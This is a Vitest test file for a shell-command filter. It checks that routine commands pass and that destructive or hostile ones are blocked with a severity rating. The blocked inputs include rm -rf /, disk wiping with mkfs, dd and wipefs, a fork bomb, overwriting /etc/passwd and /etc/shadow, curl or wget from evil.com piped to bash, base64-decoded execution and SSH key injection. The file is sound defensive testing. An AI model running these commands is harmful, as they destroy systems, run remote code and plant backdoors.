import { describe, it, expect } from 'vitest';
import { filterCommand } from '../services/command-filter.js';

describe('filterCommand', () => {
  describe('allowed commands', () => {
    it('allows basic commands', () => {
      expect(filterCommand('ls -la').allowed).toBe(true);
      expect(filterCommand('df -h').allowed).toBe(true);
      expect(filterCommand('ps aux').allowed).toBe(true);
      expect(filterCommand('cat /etc/hostname').allowed).toBe(true);
      expect(filterCommand('uname -a').allowed).toBe(true);
      expect(filterCommand('uptime').allowed).toBe(true);
    });

    it('allows safe rm commands', () => {
      expect(filterCommand('rm myfile.txt').allowed).toBe(true);
      expect(filterCommand('rm -rf /home/user/temp').allowed).toBe(true);
    });

    it('allows curl for downloading without piping to shell', () => {
      expect(filterCommand('curl -o file.tar.gz https://example.com/file.tar.gz').allowed).toBe(true);
      expect(filterCommand('curl https://api.example.com/data').allowed).toBe(true);
    });

    it('allows safe crontab commands', () => {
      expect(filterCommand('crontab -l').allowed).toBe(true);
      expect(filterCommand('crontab -e').allowed).toBe(true);
    });

    it('allows safe chmod', () => {
      expect(filterCommand('chmod 755 script.sh').allowed).toBe(true);
      expect(filterCommand('chmod +x deploy.sh').allowed).toBe(true);
    });
  });

  describe('blocked commands — critical', () => {
    it('blocks rm -rf /', () => {
      const result = filterCommand('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks rm -fr /', () => {
      const result = filterCommand('rm -fr /');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks mkfs commands', () => {
      const result = filterCommand('mkfs.ext4 /dev/sdb');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks dd writing to block device', () => {
      const result = filterCommand('dd if=/dev/zero of=/dev/sda bs=512');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks wipefs', () => {
      const result = filterCommand('wipefs -a /dev/sdb');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks fork bomb', () => {
      const result = filterCommand(':() { :|: & }; :');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks overwrite /etc/passwd', () => {
      const result = filterCommand('echo "" > /etc/passwd');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });

    it('blocks overwrite /etc/shadow', () => {
      const result = filterCommand('cat malicious > /etc/shadow');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('critical');
    });
  });

  describe('blocked commands — high', () => {
    it('blocks curl | bash', () => {
      const result = filterCommand('curl http://evil.com/script | bash');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks curl | sh', () => {
      const result = filterCommand('curl http://evil.com/script | sh');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks wget | bash', () => {
      const result = filterCommand('wget -qO- http://evil.com/script | bash');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks base64 decode and execute', () => {
      const result = filterCommand('echo "aGVsbG8=" | base64 -d | bash');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks passwd root', () => {
      const result = filterCommand('passwd root');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks SSH key injection', () => {
      const result = filterCommand('echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks overwrite /etc/hosts', () => {
      const result = filterCommand('echo "127.0.0.1 fake" > /etc/hosts');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks shutdown', () => {
      const result = filterCommand('shutdown -h now');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks reboot', () => {
      const result = filterCommand('reboot');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks halt', () => {
      const result = filterCommand('halt');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });

    it('blocks init 0', () => {
      const result = filterCommand('init 0');
      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('high');
    });
  });

  describe('filter result structure', () => {
    it('returns reason when blocked', () => {
      const result = filterCommand('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(typeof result.reason).toBe('string');
      expect(result.reason!.length).toBeGreaterThan(0);
    });

    it('returns no reason when allowed', () => {
      const result = filterCommand('ls -la');
      expect(result.allowed).toBe(true);
      expect(result.reason).toBeUndefined();
      expect(result.severity).toBeUndefined();
    });
  });
});
